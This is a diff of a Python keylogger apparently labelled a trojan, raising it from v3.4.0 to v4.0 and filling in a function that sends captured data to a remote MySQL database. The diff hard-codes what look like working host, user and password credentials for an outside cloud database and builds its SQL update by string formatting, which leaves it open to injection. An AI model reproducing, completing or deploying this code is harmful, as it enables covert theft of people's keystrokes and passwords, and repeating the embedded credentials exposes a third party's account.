@@ -10,7 +10,7 @@
 # █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
 # ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
 # ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
-# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v3.4.0
+# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v4.0
 
 # Librerías Utilizadas
 from pynput.keyboard import Key, Listener
@@ -413,14 +413,37 @@ def timeSend(): # Tiempo de envío perzonalizado
 
 def SendDataBaseMySQL():
     import pymysql
-    DB_HOST = ""                # Host
-    DB_USER = "trojankeylogg"              # Usuario de la base de datos
-    DB_PASS = "registrykeypass"              # Contraseña de la Base de Datos
-    DB_NAME = "registrykey"   # Nombre de Base de datos
+    DB_HOST = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"                # Host
+    DB_USER = "udwlsyrbtldkznqo"              # Usuario de la base de datos
+    DB_PASS = "OR2i2dfdgWek0UDiAv4f"              # Contraseña de la Base de Datos
+    DB_NAME = "bh1g5gnxzw2igrvui8hq"   # Nombre de Base de datos
     DB_PORT = "3306"    # Opcional en algunos casos
     DB_CONEX = ""
 
-    connection = pymysql.connect(host, user, password, database)
+    try:
+        connection = pymysql.connect(
+        host= DB_HOST, 
+        user = DB_USER, 
+        password = DB_PASS, 
+        database = DB_NAME)
+
+        cursor = connection.cursor()
+
+        print("Se inició correctamente [DataBase]")
+    except:
+        print("Error al iniciar sesión [DataBase]")
+
+    def UpdateUser(id,name):
+
+        sql = "Update NameTabla SET key = '{}'WHERE id={}".format(name, id)
+        try:
+            cursor.execute(sql)
+            connection.commit()
+        except:
+            print("Error al obtener")
+            pass
+        
+    UpdateUser(1,"dsf")
 
 
 
@@ -457,7 +480,7 @@ if __name__ == '__main__':
 #################################################################
 #                                                               #
 #                 Developed by SebastianEPH                     #
-#                                                   v3.4.0     #
+#                                                   v4.0   #
 #################################################################
 # NOTAS IMPORTANTES:
 #
